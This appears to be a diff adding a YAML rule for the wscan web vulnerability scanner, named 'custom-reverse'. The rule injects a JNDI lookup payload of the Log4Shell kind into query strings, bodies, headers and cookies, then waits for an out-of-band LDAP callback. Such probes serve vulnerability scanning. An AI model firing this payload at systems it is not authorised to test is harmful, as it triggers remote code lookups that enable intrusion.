@@ -1,0 +1,22 @@
+name: custom-reverse
+
+set:
+  reverse: newReverse()
+  reverseURL: reverse.ldap_url
+
+payload:
+  -  ${jndi:{{reverseURL}}}
+
+placeholder:
+  - query
+  - body
+  - header
+  - cookie
+
+expression: reverse.wait(15)
+
+detail:
+  author: shaochuyu
+  links:
+    - https://github.com/chushuai/wscan
+  version: 1.0
